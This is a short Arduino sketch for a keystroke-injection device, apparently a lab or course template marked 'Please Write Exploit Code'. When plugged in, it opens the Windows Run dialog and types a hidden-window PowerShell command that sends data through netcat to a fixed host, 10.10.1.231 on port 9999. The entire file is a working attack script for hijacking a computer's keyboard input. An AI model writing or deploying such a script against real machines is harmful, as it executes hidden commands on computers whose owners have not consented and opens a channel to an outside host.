#include <Keyboard.h>

void setup()
{
    Serial.begin(9600);
    /* Please Write Exploit Code */

    Keyboard.press(KEY_LEFT_GUI);
    delay(50);
    Keyboard.press('r');
    delay(50);
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r');
    delay(50);

    Keyboard.println("powershell.exe -WindowStyle hidden -command \"&{&\" echo \"create\" | nc 10.10.1.231 9999 -w 1\"}\";");
    delay(50);

    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);

    Keyboard.end();
}

void loop()
{
}
